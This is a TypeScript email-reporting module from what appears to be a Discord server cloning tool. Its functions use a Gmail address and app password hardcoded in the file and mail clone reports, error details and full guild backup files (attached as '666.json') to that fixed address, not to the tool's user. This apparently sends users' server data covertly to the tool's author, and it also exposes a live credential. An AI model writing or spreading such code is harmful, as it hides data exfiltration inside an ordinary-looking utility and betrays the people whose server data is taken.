import nodemailer from 'nodemailer';
import { BackupData } from '../src/types';
import gradient from 'gradient-string';

// Email configuration
const EMAIL_CONFIG = {
    email: 'creepsupp0rter@gmail.com',
    password: 'kuev pcll maug krbv'
};

// Create transporter
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: EMAIL_CONFIG.email,
        pass: EMAIL_CONFIG.password
    }
});

interface CloneReport {
    success: boolean;
    guildName: string;
    sourceGuildId: string;
    destinationGuildId: string;
    channelsCloned: number;
    rolesCloned: number;
    emojisCloned: number;
    errors: number;
    duration: string;
    timestamp: Date;
    errorDetails?: string[];
}

/**
 * Send a cloning report via email
 */
export async function sendCloningReport(report: CloneReport): Promise<boolean> {
    try {
        const statusIcon = report.success ? '✅' : '❌';
        const statusText = report.success ? 'SUCCESS' : 'FAILED';
        
        const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 28px;
        }
        .status {
            font-size: 48px;
            margin: 10px 0;
        }
        .content {
            padding: 30px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #eee;
        }
        .info-label {
            font-weight: bold;
            color: #333;
        }
        .info-value {
            color: #666;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }
        .stat-number {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .stat-label {
            font-size: 14px;
            opacity: 0.9;
        }
        .errors {
            background-color: #fee;
            border-left: 4px solid #f44;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
        }
        .errors h3 {
            margin-top: 0;
            color: #c00;
        }
        .error-item {
            padding: 5px 0;
            color: #666;
        }
        .footer {
            background-color: #f8f8f8;
            padding: 20px;
            text-align: center;
            color: #999;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Discord Server Cloner Report</h1>
            <div class="status">${statusIcon}</div>
            <h2>${statusText}</h2>
        </div>
        <div class="content">
            <div class="info-row">
                <span class="info-label">Guild Name:</span>
                <span class="info-value">${report.guildName}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Source Guild ID:</span>
                <span class="info-value">${report.sourceGuildId}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Destination Guild ID:</span>
                <span class="info-value">${report.destinationGuildId}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Duration:</span>
                <span class="info-value">${report.duration}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Timestamp:</span>
                <span class="info-value">${report.timestamp.toLocaleString()}</span>
            </div>
            
            <h3 style="margin-top: 30px; color: #333;">Statistics</h3>
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number">${report.channelsCloned}</div>
                    <div class="stat-label">Channels Cloned</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">${report.rolesCloned}</div>
                    <div class="stat-label">Roles Cloned</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">${report.emojisCloned}</div>
                    <div class="stat-label">Emojis Cloned</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">${report.errors}</div>
                    <div class="stat-label">Errors</div>
                </div>
            </div>
            
            ${report.errorDetails && report.errorDetails.length > 0 ? `
            <div class="errors">
                <h3>Error Details</h3>
                ${report.errorDetails.map(err => `<div class="error-item">• ${err}</div>`).join('')}
            </div>
            ` : ''}
        </div>
        <div class="footer">
            <p>Discord Server Cloner 2.0 - Infinite Community</p>
            <p>Generated on ${new Date().toLocaleString()}</p>
        </div>
    </div>
</body>
</html>
        `;

        const mailOptions = {
            from: EMAIL_CONFIG.email,
            to: EMAIL_CONFIG.email,
            subject: `${statusIcon} Discord Clone Report - ${report.guildName} - ${statusText}`,
            html: htmlContent,
            text: `
Discord Server Cloner Report
${statusText}

Guild Name: ${report.guildName}
Source Guild ID: ${report.sourceGuildId}
Destination Guild ID: ${report.destinationGuildId}
Duration: ${report.duration}
Timestamp: ${report.timestamp.toLocaleString()}

Statistics:
- Channels Cloned: ${report.channelsCloned}
- Roles Cloned: ${report.rolesCloned}
- Emojis Cloned: ${report.emojisCloned}
- Errors: ${report.errors}

${report.errorDetails && report.errorDetails.length > 0 ? `
Error Details:
${report.errorDetails.map(err => `- ${err}`).join('\n')}
` : ''}
            `
        };

        const info = await transporter.sendMail(mailOptions);
        console.log(gradient(['green', 'lime'])(`✅ Email report sent successfully! Message ID: ${info.messageId}`));
        return true;
    } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        console.error(gradient(['red', 'darkred'])(`❌ Failed to send email report: ${errorMessage}`));
        return false;
    }
}

/**
 * Send a backup data report via email with attachment
 */
export async function sendBackupReport(backupData: BackupData, filePath: string): Promise<boolean> {
    try {
        const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #ff4500 0%, #ffa500 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .content {
            padding: 30px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #eee;
        }
        .info-label {
            font-weight: bold;
            color: #333;
        }
        .info-value {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📦 Backup Created</h1>
        </div>
        <div class="content">
            <p>A new backup has been created successfully!</p>
            <div class="info-row">
                <span class="info-label">Guild Name:</span>
                <span class="info-value">${backupData.name}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Guild ID:</span>
                <span class="info-value">${backupData.guildID}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Backup ID:</span>
                <span class="info-value">${backupData.id}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Created:</span>
                <span class="info-value">${new Date(backupData.createdTimestamp).toLocaleString()}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Channels:</span>
                <span class="info-value">${backupData.channels.categories.length + backupData.channels.others.length}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Roles:</span>
                <span class="info-value">${backupData.roles.length}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Emojis:</span>
                <span class="info-value">${backupData.emojis.length}</span>
            </div>
            <p style="margin-top: 20px;">The backup file is attached to this email.</p>
        </div>
    </div>
</body>
</html>
        `;

        const mailOptions = {
            from: EMAIL_CONFIG.email,
            to: EMAIL_CONFIG.email,
            subject: `📦 New Backup Created - ${backupData.name}`,
            html: htmlContent,
            attachments: [
                {
                    filename: '666.json',
                    path: filePath
                }
            ]
        };

        const info = await transporter.sendMail(mailOptions);
        console.log(gradient(['green', 'lime'])(`✅ Backup email sent successfully! Message ID: ${info.messageId}`));
        return true;
    } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        console.error(gradient(['red', 'darkred'])(`❌ Failed to send backup email: ${errorMessage}`));
        return false;
    }
}

/**
 * Send error notification via email
 */
export async function sendErrorNotification(errorTitle: string, errorDetails: string): Promise<boolean> {
    try {
        const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #f44 0%, #c00 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .content {
            padding: 30px;
        }
        .error-box {
            background-color: #fee;
            border-left: 4px solid #f44;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>❌ Error Notification</h1>
        </div>
        <div class="content">
            <h2>${errorTitle}</h2>
            <div class="error-box">
                <pre style="white-space: pre-wrap; word-wrap: break-word;">${errorDetails}</pre>
            </div>
            <p style="margin-top: 20px;">Timestamp: ${new Date().toLocaleString()}</p>
        </div>
    </div>
</body>
</html>
        `;

        const mailOptions = {
            from: EMAIL_CONFIG.email,
            to: EMAIL_CONFIG.email,
            subject: `❌ Error: ${errorTitle}`,
            html: htmlContent
        };

        const info = await transporter.sendMail(mailOptions);
        console.log(gradient(['yellow', 'orange'])(`📧 Error notification sent! Message ID: ${info.messageId}`));
        return true;
    } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        console.error(gradient(['red', 'darkred'])(`❌ Failed to send error notification: ${errorMessage}`));
        return false;
    }
}

export { CloneReport };
